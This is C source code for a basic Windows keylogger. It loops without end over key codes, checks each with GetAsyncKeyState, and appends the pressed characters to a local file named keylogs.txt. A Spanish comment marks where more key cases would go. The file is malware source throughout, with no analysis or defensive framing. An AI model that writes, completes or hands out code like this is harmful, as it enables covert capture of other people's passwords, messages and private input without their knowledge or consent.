#include <windows.h>
#include <stdio.h>

int main()
{
    char c;
    while (1)
    {
        for (c = 8; c <= 222; c++)
        {
            if (GetAsyncKeyState(c) == -32767)
            {
                FILE *file;
                file = fopen("keylogs.txt", "a+");
                if ((c >= 39) && (c <= 64))
                {
                    fputc(c, file);
                    fclose(file);
                }
                else if ((c > 64) && (c < 91))
                {
                    c += 32;
                    fputc(c, file);
                    fclose(file);
                }
                else
                {
                    switch (c)
                    {
                    case VK_SPACE:
                        fputc(' ', file);
                        fclose(file);
                        break;
                    // ... agregar más casos para otros caracteres
                    default:
                        fclose(file);
                        break;
                    }
                }
            }
        }
    }
    return 0;
}
